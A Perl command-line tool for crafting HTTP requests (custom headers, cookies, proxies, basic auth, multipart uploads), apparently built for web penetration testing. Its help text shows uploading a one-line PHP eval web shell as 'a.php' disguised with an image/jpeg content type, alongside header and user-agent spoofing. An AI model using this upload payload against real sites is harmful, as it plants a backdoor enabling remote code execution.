#!/usr/bin/env perl
use strict;
use warnings;
use feature qw(say);
use URI;
use URI::Split qw(uri_split uri_join);
use URI::Escape;
use LWP::UserAgent;
use HTTP::Headers;
use HTTP::Cookies;
use HTTP::Request::Common;
use MIME::Base64 qw(encode_base64);
use Getopt::Long;
use Term::ANSIColor qw(:constants);
local $Term::ANSIColor::AUTORESET = 1;

use utf8;
binmode(STDIN, ':encoding(utf8)');
binmode(STDOUT, ':encoding(utf8)');
binmode(STDERR, ':encoding(utf8)');



my $help = q{};
my $url  = q{};
my $method = "GET";

my %headers = ();
my %cookies = ();
my %datas = ();

my $UserAgent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0";
my $proxy = q{};
my $referer = q{};
my $timeout = 180;
my $redirect = 7;


my $silent = q{};
my $raw = q{};


my $fileUpload = q{};
my $fileFiled = q{};
my $filePath = q{};
my $fileName = q{};
my $fileContent = q{};
my $fileType = q{};


my $basicAuth = q{};
my $username = q{};
my $password = q{};

GetOptions(
	"help"=>\$help,
	'url=s'=>\$url,
	'm|method=s'=>\$method, 
	'H|header=s%'=>\%headers,
	'cookie=s%'=>\%cookies,
	'd|data=s%'=>\%datas, #HTTP POST data: raw or urlencoded
	'A|user-agent=s'=>\$UserAgent,
	'e|referer=s'=>\$referer,
	'proxy=s'=>\$proxy,
    't|timeout=i'=>\$timeout,
	'F|fileUpload'=>\$fileUpload,
    'fileFiled=s'=>\$fileFiled, 
	'filePath=s'=>\$filePath,
	'fileName=s'=>\$fileName,
	'fileContent=s'=>\$fileContent,
    'fileType=s'=>\$fileType,
	's|silent'=>\$silent,
	'r|raw'=>\$raw,
    'L|redirect=i'=>\$redirect,
    'basicAuth'=>\$basicAuth,
    'username=s'=>\$username,
    'password=s'=>\$password,
);


$method = 'POST' if $fileUpload;




if($help){

    getHelp();

    exit 0;

}

die "You need to specify the url for set HTTP request \n Please run --help for more informations \n" if $url eq q{};



my $status_line =getResponse($url,\%cookies,$proxy,$timeout,$redirect,$UserAgent,$referer,\%headers,$method,\%datas,$fileUpload,$fileFiled,$filePath,$fileName,$fileContent,$fileType,$silent,$raw,$basicAuth,$username,$password);
say BOLD YELLOW $status_line;


sub getHelp{
   print <<__HELP__;

Usage: perl  $0 -url 'http://xxxx.xx.com'


where:
-help 
-url 'http://xxxx.xx.com' 
-m|method GET|POST|HEAD default value is GET

-H|header X-Forwarded-For='127.0.0.1, 127.0.0.2' -H Via='Squid'
-cookie usertrack='123456' -b hit=1
-d|data name='tanjiti' -d passwd=12345


-A|user-agent 'baiduspider' default value is Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
-e|referer 'http://www.baidu.com'

-proxy   'http://64.34.14.28:7808'
-t|timeout 120  default value is 120
-L|redirect 7  default value is 7

File Upload Options As Follows
-F|fileUpload  : Specify this is a http file upload request
-fileFiled 'uploaded' 
-filePath  '/tmp/a.jpeg' 
-fileName  'a.php' 
-fileContent '<?php eval(\$_POST[a]);?>' 
-fileType 'image/jpeg' 

-s|silent : Only return response status line
-r|raw : POST Raw Data

-basicAuth : basic Authentication
-username tanjiti
-password 12345
__HELP__

}




sub setURI{
	my ($url, $datas_ref) = @_;


	my $uri = URI->new($url);

	$uri->query_form($datas_ref) if  $datas_ref;

	return $uri;
}

sub getHostFromURL{

	my $url = shift;

	my ($scheme,$auth,$path,$query,$frag) = uri_split($url);

	my $host = $auth if defined $auth;

	return $host;
}

sub setBrowser{

	my ($proxy,$cookie,$timeout,$redirect,$silent) = @_;
	my $browser = LWP::UserAgent->new();
	$browser->timeout($timeout);
	$browser->ssl_opts(verify_hostname => 1);
    $browser->max_redirect($redirect);
	$browser ->show_progress(1) if not $silent;
	$browser->proxy([qw/http https/]=>$proxy) if $proxy;
    $browser->cookie_jar($cookie);
	return $browser;
}






sub setHeader{
	
	my ( $UserAgent,$host,$referer,$headers_ref,$basicAuth,$username,$password) = @_;

	my $header = HTTP::Headers->new();

	$header->header('Accept'=>'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
	$header->header('Accept-Encoding'=>'gzip,deflate,sdch');
	$header->header('Accept-Language'=>'zh-CN,zh;q=0.8,en;q=0.6');

	$header->header('Connection' => 'keep-alive');

	

	$header->header('User-Agent'=>$UserAgent) if $UserAgent;

	$header->header('Host'=>$host) if $host;

	$header->header('Referer'=>$referer) if $referer;
	
    if($basicAuth){
        my $authenBase64 = encode_base64("$username:$password");
        $header->header('Authorization' => "Basic $authenBase64");
    }
	
	

	my %headers = %$headers_ref;
	foreach (keys %headers){
		$header->header($_ => $headers{$_}) if $_;
	}
	


	return $header;
	
}

sub setCookie{
	

	my ($domain,$cookies_ref) = @_;


	my $version = 0;
	my $path="/";
	my $expires = "123412345";


	my $cookie_jar = HTTP::Cookies->new(hide_cookie2 => 1);
    
	my %cookies = %$cookies_ref;

	foreach (keys %cookies){

		$cookie_jar->set_cookie($version,$_,$cookies{$_},$path,$domain,undef,undef,undef,$expires,undef,undef);
	
	}
    return $cookie_jar;

}

sub setRequest{
	my ($method,$url,$header,$datas_ref,$fileUpload,$fileFiled,$filePath,$fileName,$fileContent,$fileType,$raw) = @_;

	my $request = HTTP::Request->new();
    
    #HTTP Request Method: support HEAD GET POST
    $method = uc $method;
    
    #HTTP Request Headers
    my %headers = %$header;


    #HTTP Form Data
    my %datas = %$datas_ref;
    
    #HTTP URI
    my $uri = (%datas and $method eq 'GET' or $method eq 'HEAD') ? setURI($url,\%datas) : $url;
    


    if ($method eq 'GET'){
        
        #HTTP GET Request
        $request = GET $uri,  %headers;
    
    }elsif($method eq 'HEAD'){
        
        #HTTP HEAD Request
        $request = HEAD $uri,  %headers;

    }elsif($method eq 'POST' and not $raw and not $fileUpload){
        
        #HTTP POST Form Data with application/x-www-form-urlencoded
        $request = POST $uri, %headers, Content_Type => 'application/x-www-form-urlencoded',   Content=>[%datas];

    }elsif($method eq 'POST' and $raw and not $fileUpload){
        
        #HTTP POST Form raw Data
        my $rawdata = q{};

        foreach (keys %datas){
            $rawdata .= "$_=$datas{$_}&";
        }
        chop $rawdata;

       $request = POST $uri, %headers, Content => $rawdata;

    }elsif($fileUpload and $method eq 'POST'){
        

        #HTTP File Upoad with multipart/form-data

        if (-r $filePath and ($fileType or $fileName)){
            #read file from local file and you can specify fileFiled, fileName and fileType and datas
            
            $request = POST $uri, %headers,
                    Content_Type => 'multipart/form-data',
                    Content => [ 
                        $fileFiled => [
                            $filePath,
                            $fileName,
                            "Content-Type" => $fileType,
                         ],
                    
                        %datas,
                    ];

        }elsif(-r $filePath and not $fileType and not $fileName){
            #read file from local file and you can specify the fileFiled, datas
            
            $request = POST $uri, %headers,
                    Content_Type => 'multipart/form-data',
                    Content => [
                        $fileFiled => [
                            $filePath
                        ],
                        %datas,
                    ];
        }else{
            #Your need to specify the fileFiled, fileName, fileType, fileContent, datas
            
            $request = POST $uri, %headers,
                    Content_Type => 'multipart/form-data',
                    Content => [
                        $fileFiled =>[
                            undef,
                            $fileName ,
                            "Content-Type" => $fileType,
                            "Content" => $fileContent,
                        ],

                        %datas,
                    ] ;       
        }

    }else{
        die BOLD RED "Only support GET, HEAD and POST method\n";
    }

	
    return $request;
}


    
    
sub getResponse{
    
    my ($url,$cookies_ref,$proxy,$timeout,$redirect,$UserAgent,$referer,$headers_ref,$method,$datas_ref,$fileUpload,$fileFiled,$filePath,$fileName,$fileContent,$fileType,$silent,$raw,$basicAuth,$username,$password) = @_;
    
    my %headers = %$headers_ref;

    my $host = getHostFromURL($url);

    $host = $headers{'Host'} if (exists $headers{'Host'});

    my $cookie_jar = setCookie($host,$cookies_ref);

    my $browser = setBrowser($proxy,$cookie_jar,$timeout,$redirect,$silent);

    my $header = setHeader($UserAgent,$host,$referer,$headers_ref,$basicAuth,$username,$password);

    my $request = setRequest($method,$url,$header,$datas_ref,$fileUpload,$fileFiled,$filePath,$fileName,$fileContent,$fileType,$raw);
    
    my $response = $browser->request($request);


    
    say BOLD RED $response->request->as_string if not $silent;
    say BOLD BLUE $response->headers_as_string if not $silent;
    say BOLD GREEN $response->decoded_content if not $silent and $method ne 'HEAD';
   
    
   return $response->status_line;
   
   

}
